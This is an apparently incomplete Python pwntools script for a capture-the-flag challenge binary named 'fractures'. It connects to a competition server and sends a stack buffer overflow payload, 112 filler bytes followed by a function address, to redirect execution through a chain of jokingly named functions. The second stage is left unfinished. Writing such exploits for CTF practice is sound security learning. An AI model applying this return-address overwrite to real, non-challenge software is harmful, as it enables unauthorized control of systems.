from pwn import *
#context(arch='amd64', os='linux')
context.log_level = True
binary      = ELF('fractures')
competition = True

funcNever   = p32(0x8048561)
funcGonna   = p32(0x80485e4)
funcGive    = p32(0x80486ff)
funcYou     = p32(0x80487e7)
funcUp      = p32(0x804891f)

if competition:
    conn = remote("wcscctf.org", 8181)
else:
    conn = remote('localhost', 1234)


#the first gate
def firstGate():
    print conn.recvuntil('4chan.\n') + conn.recvline()
    eipBufferOffset = 112
    filler = 'a'* eipBufferOffset
    payload = filler + funcNever
    # so i can use gdb for further analysis
    with open('payload', 'w+') as f:
        f.write(payload)
    conn.sendline(payload)

def secondGate():

    print conn.recvline() + conn.recvline()
    conn.interactive()
    eipBufferOffset =1
    filler = 'a'*eipBufferOffset
    payload = filler + funcGonna

    with open('payload', 'a') as f:
        f.write(payload)

    #conn.sendline(payload)

    #print conn.recvline()



if __name__ == "__main__":
    firstGate()
    secondGate()
